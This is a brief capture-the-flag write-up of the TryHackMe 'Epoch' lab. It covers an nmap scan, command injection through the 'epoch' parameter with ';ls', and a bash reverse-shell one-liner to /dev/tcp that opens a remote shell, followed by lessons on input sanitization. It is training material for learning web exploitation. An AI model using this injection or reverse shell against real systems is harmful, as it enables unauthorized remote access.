🎯**Target**: TryHackme Epoch (Lab CTF)  

---  

## 🛠️ Actions Taken  

### Port and Service Enumeration  

```
nmap -sV 10.10.248.27
```

| Port    | Service  | Description                    |
|---------|----------|--------------------------------|
| 22 | ssh    | OpenSSH 8.2p1 |                 |
| 80 | http     | Apache httpd                  |  



### Command Injection  

→ Upon visiting the home page, found an input field to convert epoch to UTC.  
→ The query parameter is defined as "http://10.10.248.27/?epoch="  
→ Injecting 
  ```bash
    ;ls
  ```
  - Results in outputting directory contents, confirming command injection.

### Exploitation  
→ Injected
  ```bash
  bash -i >& /dev/tcp/10.10.39.4/1234 0>&1
  ```
  - Succesfully received a reverse shell.  
→ Printing the system variables revealed the hidden flag.


## 🔍 Key Findings

→ Command injection in the input field which lead to further exploitation.  

## 📚 What I Learned

→ This was a very easy but nevertheless in real environments it is better to sanitize user input before processing them as commands.  
→ Designing alternate ways to process user input instead of passing them directly as the commands to be executed is more secure.
